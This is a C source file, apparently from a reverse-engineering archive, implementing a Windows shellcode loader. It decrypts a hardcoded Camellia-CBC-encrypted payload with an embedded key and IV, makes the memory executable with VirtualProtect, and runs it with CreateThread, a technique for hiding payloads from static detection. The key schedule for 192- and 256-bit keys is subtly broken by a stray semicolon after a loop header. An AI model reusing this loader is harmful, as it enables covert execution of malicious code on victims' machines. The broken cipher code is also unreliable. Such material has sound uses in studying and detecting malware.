/*
    Shellcode Loader
    Archive of Reversing.ID

    writing shellcode to allocated memory
    implementing Camelia algorithm.

Compile:
    $ cl.exe /nologo /Ox /MT /W0 /GS- /DNDEBUG /Tccode.cpp

Technique:
    - allocation: VirtualAlloc
    - writing:    Camellia cipher
    - permission: VirtualProtect
    - execution:  CreateThread

Reference:
    - https://github.com/ReversingID/Crypto-Reference/blob/master/Codes/Cipher/Block/Camellia/code.c

Note:
    - key size: 128-bit
    - mode: CBC (Cipher Block Chaining)
    - IV is appended into the shellcode
*/

#include <windows.h>
#include <stdint.h>
#include <stdlib.h>

/* ************************* CONFIGURATION & SEED ************************* */
#define BLOCKSIZE       128
#define BLOCKSIZEB      16
#define KEYSIZE         128
#define KEYSIZEB        16
#define SBOX1(n)    SBOX[(n)]
#define SBOX2(n)    (uint8_t) ((SBOX[(n)] >> 7 ^ SBOX[(n)] << 1) & 0xFF)
#define SBOX3(n)    (uint8_t) ((SBOX[(n)] >> 1 ^ SBOX[(n)] << 7) & 0xFF)
#define SBOX4(n)    SBOX[((n) << 1 ^ (n) >> 7) & 0xFF]

uint8_t SIGMA[48] = 
{
    0xA0, 0x9E, 0x66, 0x7F, 0x3B, 0xCC, 0x90, 0x8B,
    0xB6, 0x7A, 0xE8, 0x58, 0x4C, 0xAA, 0x73, 0xB2,
    0xC6, 0xEF, 0x37, 0x2F, 0xE9, 0x4F, 0x82, 0xBE,
    0x54, 0xFF, 0x53, 0xA5, 0xF1, 0xD3, 0x6F, 0x1C,
    0x10, 0xE5, 0x27, 0xFA, 0xDE, 0x68, 0x2D, 0x1D,
    0xB0, 0x56, 0x88, 0xC2, 0xB3, 0xE6, 0xC1, 0xFD
};

const int32_t KSFT1[26] = 
{
     0, 64,  0, 64, 15, 79,  15, 79,  30, 94, 45, 109, 45, 124, 60, 124, 
    77, 13, 94, 30, 94, 30, 111, 47, 111, 47 
};

const int32_t KIDX1[26] =
{
    0, 0, 4, 4, 0, 0, 4, 4, 4, 4, 0, 0, 4, 0, 4, 4,
    0, 0, 0, 0, 4, 4, 0, 0, 4, 4 
};

const int32_t KSFT2[34] = 
{
     0,  64,  0,  64, 15,  79, 15, 79, 30, 94, 30, 94, 45, 109,  45, 109,
    60, 124, 60, 124, 60, 124, 77, 13, 77, 13, 94, 30, 94,  30, 111,  47,
    111, 47 
};

const int32_t KIDX2[34] = 
{
     0,  0, 12, 12, 8, 8, 4, 4, 8, 8, 12, 12, 0, 0, 4, 4, 
     0,  0, 8, 8, 12, 12, 0, 0, 4, 4,  8,  8, 4, 4, 0, 0,
    12, 12 
};

const uint8_t SBOX[256] = 
{
    112, 130,  44, 236, 179,  39, 192, 229, 228, 133,  87,  53, 234,  12, 174,  65,
     35, 239, 107, 147,  69,  25, 165,  33, 237,  14,  79,  78,  29, 101, 146, 189,
    134, 184, 175, 143, 124, 235,  31, 206,  62,  48, 220,  95,  94, 197,  11,  26,
    166, 225,  57, 202, 213,  71,  93,  61, 217,   1,  90, 214,  81,  86, 108,  77,
    139,  13, 154, 102, 251, 204, 176,  45, 116,  18,  43,  32, 240, 177, 132, 153,
    223,  76, 203, 194,  52, 126, 118,   5, 109, 183, 169,  49, 209,  23,   4, 215,
     20,  88,  58,  97, 222,  27,  17,  28,  50,  15, 156,  22,  83,  24, 242,  34,
    254,  68, 207, 178, 195, 181, 122, 145,  36,   8, 232, 168,  96, 252, 105,  80,
    170, 208, 160, 125, 161, 137,  98, 151,  84,  91,  30, 149, 224, 255, 100, 210,
     16, 196,   0,  72, 163, 247, 117, 219, 138,   3, 230, 218,   9,  63, 221, 148,
    135,  92, 131,   2, 205,  74, 144,  51, 115, 103, 246, 243, 157, 127, 191, 226,
     82, 155, 216,  38, 200,  55, 198,  59, 129, 150, 111,  75,  19, 190,  99,  46,
    233, 121, 167, 140, 159, 110, 188, 142,  41, 245, 249, 182,  47, 253, 180,  89,
    120, 152,   6, 106, 231,  70, 113, 186, 212,  37, 171,  66, 136, 162, 141, 250,
    114,   7, 185,  85, 248, 238, 172,  10,  54,  73,  42, 104,  60,  56, 241, 164,
     64,  40, 211, 123, 187, 201,  67, 193,  21, 227, 173, 244, 119, 199, 128, 158
};

/* context and configuration */
typedef struct 
{
    uint32_t bits;              /* ukuran kunci dalam bits */
    uint8_t  ekeys[288];
} camellia_t;


/* ********************* INTERNAL FUNCTIONS PROTOTYPE ********************* */
void block_decrypt(camellia_t * config, uint8_t val[BLOCKSIZEB]);
void key_setup(camellia_t * config, uint8_t secret[32], uint32_t bits);

void swap_half(uint8_t x[16]);
void rot_block(uint32_t dst[2], const uint32_t src[4],  const uint32_t n);
void dword2byte(uint8_t dst[16], const uint32_t src[4]);
void byte2dword(uint32_t dst[4], const uint8_t src[16]);
void feistel(uint8_t y[8], const uint8_t x[8], const uint8_t k[8]);
void fl_layer(uint8_t x[16], const uint8_t kl[16], const uint8_t kr[16]);


/* *************************** HELPER FUNCTIONS *************************** */
/* XOR 2 data block */
void xor_block(uint8_t * dst, uint8_t * src1, uint8_t * src2)
{
    register uint32_t i = 0;
    for (i = 0; i < BLOCKSIZEB; i++)
        dst[i] = src1[i] ^ src2[i];
}

void decrypt (uint8_t * data, uint32_t size, uint8_t * key, uint8_t * iv)
{
    camellia_t  config;
    uint32_t    i;
    uint8_t     prev_block[BLOCKSIZEB];
    uint8_t     cipher_block[BLOCKSIZEB];

    // configure 
    key_setup(&config, key, KEYSIZE);

    memcpy(prev_block, iv, BLOCKSIZEB);

    for (i = 0; i < size; i += BLOCKSIZEB)
    {
        // copy to temporary block
        memcpy(cipher_block, &data[i], BLOCKSIZEB);

        // decrypt the block
        block_decrypt(&config, &data[i]);

        // XOR the previous ciphertext with current ciphertext block
        xor_block(&data[i], &data[i], prev_block);

        // copy the current ciphertext as previous block
        memcpy(prev_block, cipher_block, BLOCKSIZEB); 
    }
}


int main ()
{
    void *  runtime;
    BOOL    retval;
    HANDLE  th_shellcode;
    DWORD   old_protect = 0;

    // shellcode storage in stack
    // IV is embedded within, so we need to mark both payload and IV
    uint8_t     payload []  = { 
        0x9b, 0x6b, 0x33, 0x5d, 0x9d, 0x73, 0x1f, 0x4f, 0x52, 0x7a, 0xee, 0xe8, 0xc3, 0x54, 0x87, 0x7d,
        0xeb, 0xb7, 0x47, 0xcb, 0xac, 0xf2, 0x18, 0x05, 0xbe, 0x7d, 0x99, 0x16, 0x7e, 0xd7, 0x6d, 0x6d,
        0x3b, 0x95, 0x17, 0xc4, 0xc1, 0x90, 0xf1, 0x42, 0xa4, 0x33, 0x0f, 0x29, 0x3f, 0x47, 0x35, 0xfd
    };
    uint32_t    payload_len = 32;
    uint8_t*    iv = &payload[payload_len];

    // secret-key
    uint8_t     key[] = 
            { 0x52, 0x45, 0x56, 0x45, 0x52, 0x53, 0x49, 0x4E, 0x47, 0x2E, 0x49, 0x44, 
    /* ASCII:   R     E     V     E     R     S     I     N     G     .     I     D  */
              0x31, 0x33, 0x33, 0x37 };
            /*  1     3     3     7  */

    // allocate memory buffer for payload as READ-WRITE (no executable)
    runtime = VirtualAlloc (0, payload_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // decrypt data
    RtlMoveMemory (runtime, payload, payload_len);
    decrypt ((uint8_t*)runtime, payload_len, key, iv);

    // make buffer executable (R-X)
    retval  = VirtualProtect (runtime, payload_len, PAGE_EXECUTE_READ, &old_protect);
    if (retval != 0)
    {
        th_shellcode = CreateThread (0, 0, (LPTHREAD_START_ROUTINE) runtime, 0, 0, 0);
        WaitForSingleObject (th_shellcode, -1);
    }

    VirtualFree (runtime, payload_len, MEM_RELEASE);

    return 0;
}

void block_decrypt (camellia_t * config, uint8_t val[BLOCKSIZEB])
{
    int32_t i;
    uint8_t p[BLOCKSIZEB];

    if (config->bits == 128)
    {
        xor_block(p, val, config->ekeys + 192);
    }
    else 
    {
        xor_block(p, val, config->ekeys + 256);

        for (i = 2; i >= 0; i--)
        {
            feistel(p + 8, p    , config->ekeys + 216 + (i << 4));
            feistel(p    , p + 8, config->ekeys + 208 + (i << 4));
        }

        fl_layer(p, config->ekeys + 200, config->ekeys + 192);
    }

    for (i = 2; i >= 0; i--)
    {
        feistel(p + 8, p    , config->ekeys + 152 + (i << 4));
        feistel(p    , p + 8, config->ekeys + 144 + (i << 4));
    }

    fl_layer(p, config->ekeys + 136, config->ekeys + 128);

    for (i = 2; i >= 0; i--)
    {
        feistel(p + 8, p    , config->ekeys + 88 + (i << 4));
        feistel(p    , p + 8, config->ekeys + 80 + (i << 4));
    }

    fl_layer(p, config->ekeys + 72, config->ekeys + 64);

    for (i = 2; i >= 0; i--)
    {
        feistel(p + 8, p    , config->ekeys + 24 + (i << 4));
        feistel(p    , p + 8, config->ekeys + 16 + (i << 4));
    }

    swap_half(p);
    xor_block(val, p, config->ekeys);
}

void key_setup(camellia_t * config, uint8_t secret[32], uint32_t bits)
{
    uint8_t  t[64];
    uint32_t u[20];
    uint32_t i;

    config->bits = bits;
    switch (config->bits)
    {
        case 128:
            for (i =  0; i < 16; i++) t[i] = secret[i];
            for (i = 16; i < 32; i++) t[i] = 0;
            break;
        case 192:
            for (i =  0; i < 24; i++) t[i] = secret[i];
            for (i = 24; i < 32; i++) t[i] = secret[i - 8] ^ 0xFF;
            break;
        case 256:
            for (i = 0; i < 32; i++) t[i] = secret[i];
            break;
    }
    
    xor_block(t + 32, t     , t + 16);

    feistel(t + 40, t + 32, SIGMA    );
    feistel(t + 32, t + 40, SIGMA + 8);

    xor_block(t + 32, t + 32, t     );

    feistel(t + 40, t + 32, SIGMA + 16);
    feistel(t + 32, t + 40, SIGMA + 24);

    byte2dword(u    , t   );
    byte2dword(u + 4, t+32);

    if (config->bits == 128)
    {
        for (i = 0; i < 26; i += 2)
        {
            rot_block(u + 16, u + KIDX1[i    ], KSFT1[i    ]);
            rot_block(u + 18, u + KIDX1[i + 1], KSFT1[i + 1]);
            dword2byte(config->ekeys + (i << 3), u + 16);
        }
    }
    else 
    {
        xor_block(t + 48, t + 16, t + 32);

        feistel(t + 56, t + 48, SIGMA + 32);
        feistel(t + 48, t + 56, SIGMA + 40);

        byte2dword(u +  8, t + 16);
        byte2dword(u + 12, t + 48);

        for (i = 0; i < 34; i += 2);
        {
            rot_block(u + 16, u + KIDX2[i    ], KSFT2[i    ]);
            rot_block(u + 18, u + KIDX2[i + 1], KSFT2[i + 1]);
            dword2byte(config->ekeys + (i << 3), u + 16);
        }
    }
}

void swap_half(uint8_t x[16])
{
    uint8_t  t;
    uint32_t i;

    for (i = 0; i < 8; i++)
    {
        t        = x[i];
        x[i]     = x[8 + i];
        x[8 + i] = t;
    }
}

void rot_block(uint32_t dst[2], const uint32_t src[4],  const uint32_t n)
{
    uint32_t r;

    /* r < 32 */
    if (r = (n & 31))
    {
        dst[0] = (src[ (n >> 5)      & 3] << r) ^ (src[((n >> 5) + 1) & 3] >> (32 - r));
        dst[1] = (src[((n >> 5) + 1) & 3] << r) ^ (src[((n >> 5) + 2) & 3] >> (32 - r));
    }
    else 
    {
        dst[0] = src[ (n >> 5)      & 3];
        dst[1] = src[((n >> 5) + 1) & 3];
    }
}

void dword2byte(uint8_t dst[16], const uint32_t src[4])
{
    uint32_t i;
    for (i = 0; i < 4; i++)
    {
        dst[(i << 2)    ] = (uint8_t)((src[i] >> 24) & 0xFF);
		dst[(i << 2) + 1] = (uint8_t)((src[i] >> 16) & 0xFF);
		dst[(i << 2) + 2] = (uint8_t)((src[i] >>  8) & 0xFF);
		dst[(i << 2) + 3] = (uint8_t)((src[i]      ) & 0xFF);
    }
}

void byte2dword(uint32_t dst[4], const uint8_t src[16])
{
    uint32_t i;
    for (i = 0; i < 4; i++)
    {
        dst[i] = ((uint32_t) src[(i << 2)    ] << 24)
               | ((uint32_t) src[(i << 2) + 1] << 16)
               | ((uint32_t) src[(i << 2) + 2] <<  8)
               | ((uint32_t) src[(i << 2) + 3]      );
    }
}

void feistel(uint8_t y[8], const uint8_t x[8], const uint8_t k[8])
{
    uint8_t t[8];

    t[0] = SBOX1(x[0] ^ k[0]);
    t[1] = SBOX2(x[1] ^ k[1]);
    t[2] = SBOX3(x[2] ^ k[2]);
    t[3] = SBOX4(x[3] ^ k[3]);
    t[4] = SBOX2(x[4] ^ k[4]);
    t[5] = SBOX3(x[5] ^ k[5]);
    t[6] = SBOX4(x[6] ^ k[6]);
    t[7] = SBOX1(x[7] ^ k[7]);

	y[0] ^= t[0] ^ t[2] ^ t[3] ^ t[5] ^ t[6] ^ t[7];
	y[1] ^= t[0] ^ t[1] ^ t[3] ^ t[4] ^ t[6] ^ t[7];
	y[2] ^= t[0] ^ t[1] ^ t[2] ^ t[4] ^ t[5] ^ t[7];
	y[3] ^= t[1] ^ t[2] ^ t[3] ^ t[4] ^ t[5] ^ t[6];
	y[4] ^= t[0] ^ t[1] ^ t[5] ^ t[6] ^ t[7];
	y[5] ^= t[1] ^ t[2] ^ t[4] ^ t[6] ^ t[7];
	y[6] ^= t[2] ^ t[3] ^ t[4] ^ t[5] ^ t[7];
	y[7] ^= t[0] ^ t[3] ^ t[4] ^ t[5] ^ t[6];
}

void fl_layer(uint8_t x[16], const uint8_t kl[16], const uint8_t kr[16])
{
    uint32_t t[4], u[4], v[4];

    byte2dword(t,  x);
    byte2dword(u, kl);
    byte2dword(v, kr);

	t[1] ^= ((t[0] & u[0]) << 1) ^ ((t[0] & u[0]) >> 31);
	t[0] ^= t[1] | u[1];
	t[2] ^= t[3] | v[1];
	t[3] ^= ((t[2] & v[0]) << 1) ^ ((t[2] & v[0]) >> 31);

    dword2byte(x, t);
}